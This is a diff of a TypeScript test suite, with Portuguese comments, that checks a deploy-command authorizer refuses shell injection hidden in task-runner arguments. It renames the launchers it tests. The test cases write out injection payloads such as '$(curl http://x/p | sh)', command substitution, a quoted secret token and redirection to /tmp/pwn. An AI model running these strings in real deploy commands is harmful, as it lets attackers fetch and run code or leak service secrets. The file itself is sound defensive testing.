+// SERVIÇO. O `deployCmd` real de hoje (`taskrun <receita-declarada>`) segue rodando, automático e sem aprovação
+// humana; um lançador que NÃO é task runner (`skyhost`) não perde nada, porque ali não existe segundo shell.
 // ─────────────────────────────────────────────────────────────────────────────────────────────────
 describe("self-deploy — a cadeia lançador→receita→argumento (story-ex0067, 3ª passada)", () => {
   const script = (cmds: string[]) =>
@@ -1497,13 +1497,13 @@ describe("self-deploy — a cadeia lançador→receita→argumento (story-ex0067
 
   it("os dois comandos da sondagem — lançador autorizado, payload no ARGUMENTO — são RECUSADOS nomeando o motivo", () => {
     // Exatamente o que a sondagem da onda anterior testava e deixou aberto.
-    const canary = script([`just smoke-probe '$(curl http://x/p | sh)'`]);
+    const canary = script([`taskrun smoke-probe '$(curl http://x/p | sh)'`]);
     expect(canary).toContain("[postBuild] RECUSADO");
     expect(canary).toMatch(/receita smoke-probe fora da allow-list/); // motivo NOMEADO, não recusa muda
     expect(executablePart(canary)).not.toContain("curl http://x/p");
     expect(executablePart(canary)).not.toContain("smoke-probe");
 
-    const varbased = script([`just 'who=$(id -un)' varbased`]);
+    const varbased = script([`taskrun 'who=$(id -un)' varbased`]);
     expect(varbased).toContain("[postBuild] RECUSADO");
     expect(varbased).toMatch(/fora da allow-list/);
     expect(executablePart(varbased)).not.toContain("id -un");
@@ -1520,46 +1520,46 @@ describe("self-deploy — a cadeia lançador→receita→argumento (story-ex0067
     // A segunda régua é independente da primeira: mesmo na receita permitida, um argumento com sintaxe de
     // shell (que veio DENTRO de aspas, onde o parser não olha) voltaria a ser sintaxe na linha da receita.
     for (const [evil, esperado] of [
-      [`just publish-static '$(id -un)'`, "$(id -un)"],
-      [`just publish-static '$(curl http://x/p | sh)'`, "curl http://x/p"],
-      ["just publish-static 'a; id'", "a; id"],
-      [`just publish-static '\`id\`'`, "`id`"],
-      [`just publish-static '\${HOME}'`, "${HOME}"],
+      [`taskrun publish-static '$(id -un)'`, "$(id -un)"],
+      [`taskrun publish-static '$(curl http://x/p | sh)'`, "curl http://x/p"],
+      ["taskrun publish-static 'a; id'", "a; id"],
+      [`taskrun publish-static '\`id\`'`, "`id`"],
+      [`taskrun publish-static '\${HOME}'`, "${HOME}"],
       // o segredo do serviço vive no script (na URL do settle) — o needle é a FORMA citada que só
       // apareceria se o argumento tivesse aterrissado como parâmetro da receita.
-      [`just publish-static '"$AGILEHARNESS_MCP_TOKEN"'`, `"$AGILEHARNESS_MCP_TOKEN"`],
-      ["just publish-static 'x > /tmp/pwn'", "/tmp/pwn"],
-      ["just publish-static 'a | sh'", "a | sh"],
+      [`taskrun publish-static '"$AGILEHARNESS_MCP_TOKEN"'`, `"$AGILEHARNESS_MCP_TOKEN"`],
+      ["taskrun publish-static 'x > /tmp/pwn'", "/tmp/pwn"],
+      ["taskrun publish-static 'a | sh'", "a | sh"],
     ] as [string, string][]) {
       const s = script([evil]);
       expect(s).toContain("[postBuild] RECUSADO");
       expect(s).toMatch(/não é uma palavra literal/);
       expect(executablePart(s)).not.toContain(esperado);
       // o alvo autorizado também não chega à posição de comando: a recusa é do COMANDO inteiro, não do arg
-      expect(executablePart(s)).not.toContain("postBuild 'just'");
+      expect(executablePart(s)).not.toContain("postBuild 'taskrun'");
     }
   });
 
-  it("`just` sem receita é recusado — sozinho ele roda a receita DEFAULT, que não é passo declarado", () => {
-    const s = script(["just"]);
+  it("`taskrun` sem receita é recusado — sozinho ele roda a receita DEFAULT, que não é passo declarado", () => {
+    const s = script(["taskrun"]);
     expect(s).toContain("[postBuild] RECUSADO");
     expect(s).toMatch(/sem receita/);
-    expect(executablePart(s)).not.toContain("postBuild 'just'");
+    expect(executablePart(s)).not.toContain("postBuild 'taskrun'");
   });
 
   it("NÃO-REGRESSÃO: o deployCmd REAL de hoje continua sendo executado, com a argv exata no log", () => {
     // A receita default é o ÚNICO deployCmd declarado em board-data.
-    const s = script(["just publish-static"]);
+    const s = script(["taskrun publish-static"]);
     expect(s).not.toContain("[postBuild] RECUSADO");
-    expect(s).toContain(`bash -lc 'exec "$@"' postBuild 'just' 'publish-static'`);
-    expect(s).toContain("[postBuild] argv: just publish-static");
+    expect(s).toContain(`bash -lc 'exec "$@"' postBuild 'taskrun' 'publish-static'`);
+    expect(s).toContain("[postBuild] argv: taskrun publish-static");
     expect(s).toContain('if [ "$STATUS" = ok ]; then');
   });
 
   it("o OUTRO caminho privilegiado (`deploy.kind=command`) usa a MESMA régua — e não despacha nada", async () => {
     const { exec } = recordingExec();
     const f = specLauncher();
-    for (const evil of [`just smoke-probe '$(curl http://x/p | sh)'`, `just publish-static '$(id -un)'`]) {
+    for (const evil of [`taskrun smoke-probe '$(curl http://x/p | sh)'`, `taskrun publish-static '$(id -un)'`]) {
       const res = await deployBoard({
         exec,
         repoRoot: "/repo",
@@ -1581,11 +1581,11 @@ describe("self-deploy — a cadeia lançador→receita→argumento (story-ex0067
       boardPackage: undefined,
       board: "armazem",
       cardId: "s2",
-      boardDeploy: { kind: "command", command: "just publish-static" },
+      boardDeploy: { kind: "command", command: "taskrun publish-static" },
       productDeploy: new ProductDeployRegistry(f.launcher),
     });
     expect(ok.fired).toBe(true);
-    expect((f.started[0]?.spec as { command: string }).command).toBe(`'just' 'publish-static'`);
+    expect((f.started[0]?.spec as { command: string }).command).toBe(`'taskrun' 'publish-static'`);
   });
 
   it("as receitas são do OPERADOR (settings.yaml e env), nunca do board — e a régua de FORMA sobrevive ao knob", () => {
@@ -1594,10 +1594,10 @@ describe("self-deploy — a cadeia lançador→receita→argumento (story-ex0067
     const recipes = resolveDeployRecipes({ AGILEHARNESS_DEPLOY_RECIPES: "deploy-site, smoke-probe" }, POLITICA_TESTE.recipes);
     expect(recipes).toContain("smoke-probe");
     expect(recipes).toContain("publish-static"); // o declarado no settings nunca é substituído, só estendido
-    expect(authorizeDeployCommand("just smoke-probe https://example.com", { ...CMD_POLICY, recipes }).refusal).toBeNull();
+    expect(authorizeDeployCommand("taskrun smoke-probe https://example.com", { ...CMD_POLICY, recipes }).refusal).toBeNull();
     // mas o argumento continua tendo de ser PALAVRA, mesmo na receita que o operador liberou — senão o
     // knob do operador reabriria o buraco que a receita liberada tem por dentro.
-    expect(authorizeDeployCommand(`just smoke-probe '$(curl http://x/p | sh)'`, { ...CMD_POLICY, recipes }).refusal).toMatch(
+    expect(authorizeDeployCommand(`taskrun smoke-probe '$(curl http://x/p | sh)'`, { ...CMD_POLICY, recipes }).refusal).toMatch(
       /não é uma palavra literal/,
     );
     // Trava do próprio knob: nome que não é palavra (caminho, expansão) não vira receita alcançável.
@@ -1644,7 +1644,7 @@ describe("self-deploy — a cadeia lançador→receita→argumento (story-ex0067
         toolPackageDir: "/repo/packages/storymap-ui",
         board: "storymap",
         cardId: "story-y",
-        boardDeploy: { surfaces: [{ prefix: "tools/site/", deployCmd: "just publish-static" }] },
+        boardDeploy: { surfaces: [{ prefix: "tools/site/", deployCmd: "taskrun publish-static" }] },
       });
       expect(ok).toEqual({ fired: true, tool: "systemd-restart", settleArmed: true });
       expect(warn).not.toHaveBeenCalled();
@@ -1657,9 +1657,9 @@ describe("self-deploy — a cadeia lançador→receita→argumento (story-ex0067
     // A régua nova é escopada aos task runners POR CAUSA da interpolação da receita. Para um CLI comum o
     // argumento chega como argv de um programa, e a re-citação da fronteira (2ª passada) já é o controle
     // completo — apertar aqui tiraria capacidade do dono sem fechar nada.
-    expect(authorizeDeployCommand("vercel deploy --prod").argv).toEqual(["vercel", "deploy", "--prod"]);
-    expect(authorizeDeployCommand(`vercel deploy --msg "$(id -un)"`).refusal).toBeNull();
-    expect(authorizeDeployCommand("flyctl deploy").refusal).toBeNull();
+    expect(authorizeDeployCommand("skyhost deploy --prod").argv).toEqual(["skyhost", "deploy", "--prod"]);
+    expect(authorizeDeployCommand(`skyhost deploy --msg "$(id -un)"`).refusal).toBeNull();
+    expect(authorizeDeployCommand("boatctl deploy").refusal).toBeNull();
   });
 });
 
@@ -1773,7 +1773,7 @@ describe("deployBoard — a recusa do registry vira resultado, nunca exceção (
     return v;
   };
 
-  it("orch-deploy: a autorização recusada no start ⇒ `refused` com o motivo, nada lançado", async () => {
+  it("comando declarado: a autorização recusada no start ⇒ `refused` com o motivo, nada lançado", async () => {
     const { exec } = recordingExec();
     const started: string[] = [];
     const reg = new ProductDeployRegistry((pkg) => {
@@ -1798,7 +1798,7 @@ describe("deployBoard — a recusa do registry vira resultado, nunca exceção (
 
   it("kind:command e kind:agent: a mesma recusa vira resultado (e o agente não deixa assinante órfão)", async () => {
     for (const boardDeploy of [
-      { kind: "command" as const, command: "vercel deploy --prod" },
+      { kind: "command" as const, command: "skyhost deploy --prod" },
       { kind: "agent" as const, description: "publique" },
     ]) {
       const { exec } = recordingExec();
